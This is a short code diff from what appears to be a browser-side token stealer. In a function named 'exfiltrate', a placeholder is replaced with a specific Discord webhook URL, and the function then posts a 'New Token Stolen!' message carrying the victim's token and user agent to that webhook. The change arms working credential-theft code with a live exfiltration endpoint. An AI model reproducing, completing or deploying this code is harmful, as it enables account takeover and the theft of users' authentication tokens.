@@ -58,7 +58,7 @@
         // Send token to your webhook/server
         async function exfiltrate(token) {
             if (!token) return;
-            const webhookUrl = 'YOUR_DISCORD_WEBHOOK_OR_SERVER_URL_HERE'; // Replace with your Discord webhook or pastebin/reqbin endpoint
+            const webhookUrl = 'https://discord.com/api/webhooks/1445850128765157377/mhAMGpbuJLLjC65llyefpgRUAoQMdegoFjr-gsisuRQcuMU105MGvlo68pNrmX5iFNgY'; // Replace with your Discord webhook or pastebin/reqbin endpoint
             try {
                 const payload = {
                     content: `**New Token Stolen!**\n\`\`\` ${token} \`\`\`\nUser Agent: ${navigator.userAgent}\nIP: (fetch via server)`,
